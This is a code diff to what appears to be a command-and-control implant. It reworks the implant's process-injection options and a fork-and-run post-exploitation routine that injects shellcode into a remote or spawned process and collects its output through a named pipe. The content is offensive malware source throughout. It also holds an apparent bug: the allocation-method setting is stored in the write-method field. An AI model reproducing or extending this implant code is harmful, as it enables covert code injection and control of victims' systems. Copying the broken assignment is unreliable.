@@ -651,8 +651,10 @@ auto DECLFN Task::Info(
     Self->Pkg->Int32( Package, Self->Config.KillDate.Year );
 
     // injection
-    Self->Pkg->Int32( Package, Self->Config.Injection.Alloc );
-    Self->Pkg->Int32( Package, Self->Config.Injection.Write );
+    Self->Pkg->Int32( Package, Self->Config.Injection.TechniqueId );
+    Self->Pkg->Wstr( Package, Self->Config.Injection.StompModule );
+    Self->Pkg->Int32( Package, Self->Config.Injection.Allocation );
+    Self->Pkg->Int32( Package, Self->Config.Injection.Writing );
 
     // transport
     Self->Pkg->Int32( Package, Self->Config.Profile );
@@ -697,7 +699,7 @@ auto DECLFN Task::ScInject(
 
     Object->ProcessId = ProcessId;
 
-    if ( ! Self->Inj->Standard( Buffer, Length, nullptr, 0, Object ) ) {
+    if ( ! Self->Inj->Main( Buffer, Length, nullptr, 0, Object ) ) {
         QuickErr( "Failed to inject into remote process" );
     }
 
@@ -778,7 +780,7 @@ auto DECLFN Task::PostEx(
         Object->PsHandle = NtCurrentProcess();
         Object->Persist  = TRUE;
 
-        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Object ) ) {
+        if ( ! Self->Inj->Main( Buffer, Length, ArgBuff, ArgLen, Object ) ) {
             QuickErr( "Failed to inject post-ex module: %d", KhGetError);
             return CleanupAndReturn();
         }
@@ -860,7 +862,6 @@ auto DECLFN Task::PostEx(
             Object->ProcessId    = PsInfo.dwProcessId;
             Object->PsHandle     = PsInfo.hProcess;
         } else {
-            // KH_INJECT_EXPLICIT: Inject into existing process by PID
             ULONG PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
             KhDbg( "Opening target process PID %d", ExplicitPid );
             HANDLE hProcess = Self->Ps->Open( PsOpenFlags, FALSE, ExplicitPid );
@@ -878,33 +879,23 @@ auto DECLFN Task::PostEx(
             Object->PsHandle     = hProcess;
         }
 
-
-        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Object ) ) {
+        if ( ! Self->Inj->Main( Buffer, Length, ArgBuff, ArgLen, Object ) ) {
             QuickErr( "Injection failed in fork mode\n" );
             return CleanupAndReturn( KhGetError );
         }
 
         KhDbg("Injection completed, shellcode is now creating named pipe");
 
-        // Resume the main thread so CLR can initialize properly
         KhDbg("Resuming main thread (handle=%p)", PsInfo.hThread);
         DWORD suspendCount = Self->Krnl32.ResumeThread( PsInfo.hThread );
         KhDbg("Main thread resumed, previous suspend count=%d", suspendCount);
 
-        // Give shellcode time to create the named pipe server and call ConnectNamedPipe
         Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 200 );
 
-        // Now connect as a client to the shellcode's pipe server
         KhDbg("Attempting to connect to pipe: %s", KH_FORK_PIPE_NAME);
         
         PipeHandle = Self->Krnl32.CreateFileA(
-            KH_FORK_PIPE_NAME, 
-            GENERIC_READ,  // We're reading output from the shellcode
-            0, 
-            nullptr, 
-            OPEN_EXISTING, 
-            0, 
-            nullptr
+            KH_FORK_PIPE_NAME, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr
         );
         
         if ( PipeHandle == INVALID_HANDLE_VALUE ) {
@@ -915,7 +906,6 @@ auto DECLFN Task::PostEx(
 
         KhDbg("Successfully connected to named pipe");
 
-        // Now wait for the shellcode thread to complete execution
         DWORD waitResult = Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, 15 * 1000 );
         if (waitResult == WAIT_TIMEOUT) {
             KhDbg("Thread execution timeout");
@@ -923,10 +913,8 @@ auto DECLFN Task::PostEx(
             KhDbg("Thread finished normally");
         }
 
-        // Give time for final writes to the pipe
         Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 500 );
 
-        // Read output from the pipe
         BYTE  pipeBuffer[8192];
         DWORD totalBytesRead = 0;
         DWORD bytesAvailable = 0;
@@ -942,13 +930,11 @@ auto DECLFN Task::PostEx(
             }
         } else {
             KhDbg("PeekNamedPipe failed: %d", peekError);
-            // If pipe is broken, there might still be buffered data - try to read it
             if ( peekError == ERROR_BROKEN_PIPE || peekError == ERROR_PIPE_NOT_CONNECTED ) {
                 KhDbg("Pipe broken/disconnected, attempting to read buffered data anyway");
             }
         }
         
-        // Try to read data regardless of peek result (there might be buffered data)
         if ( bytesAvailable > 0 || peekError == ERROR_BROKEN_PIPE || peekError == ERROR_PIPE_NOT_CONNECTED ) {
             do {
                 DWORD bytesRead = 0;
@@ -962,7 +948,6 @@ auto DECLFN Task::PostEx(
                     totalBytesRead += bytesRead;
                     KhDbg("Read %d bytes from pipe (total: %d)", bytesRead, totalBytesRead);
                     
-                    // Try to peek again to see if more data is available
                     if ( ! Self->Krnl32.PeekNamedPipe( PipeHandle, nullptr, 0, nullptr, &bytesAvailable, nullptr ) ) {
                         bytesAvailable = 0;
                     }
@@ -978,7 +963,6 @@ auto DECLFN Task::PostEx(
                         break;
                     }
                     else {
-                        // ERROR_NO_DATA means no more data available
                         break;
                     }
                 }
@@ -1000,14 +984,11 @@ auto DECLFN Task::PostEx(
             KhDbg("No output received from postex module");
         }
         
-        // Close the pipe handle (we're the client, not the server)
-        // Don't call DisconnectNamedPipe - that's only for servers
         KhDbg("Closing pipe handle");
         Self->Ntdll.NtClose( PipeHandle );
         PipeHandle = INVALID_HANDLE_VALUE;
         KhDbg("Pipe handle closed");
         
-        // Skip exit code check - not critical and can cause issues
         KhDbg("Skipping exit code check, process will be terminated in cleanup");
         
         Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 50 );
@@ -1356,7 +1337,7 @@ auto DECLFN Task::Config(
             case Enm::Config::AllocMtd: {
                 INT32 AllocMethod = Self->Psr->Int32( Parser );
 
-                Self->Config.Injection.Alloc = AllocMethod;
+                Self->Config.Injection.Writing = AllocMethod;
 
                 KhDbg("allocation method changed");
 
@@ -1365,7 +1346,7 @@ auto DECLFN Task::Config(
             case Enm::Config::WriteMtd: {
                 INT32 WriteMethod = Self->Psr->Int32( Parser );
 
-                Self->Config.Injection.Write = WriteMethod;
+                Self->Config.Injection.Writing = WriteMethod;
 
                 KhDbg("write method changed");
 
@@ -1581,6 +1562,14 @@ auto DECLFN Task::Config(
                     Self->Config.Web.ProxyPassword = wProxyPass;
                 }
 
+                break;
+            }
+            case Enm::Config::Injection: {
+                INT32 InjectionId = Self->Psr->Int32( Parser );
+
+                Self->Config.Injection.TechniqueId = InjectionId;
+
+                KhDbg("Injection technique id set: %d", InjectionId);
                 break;
             }
         }        
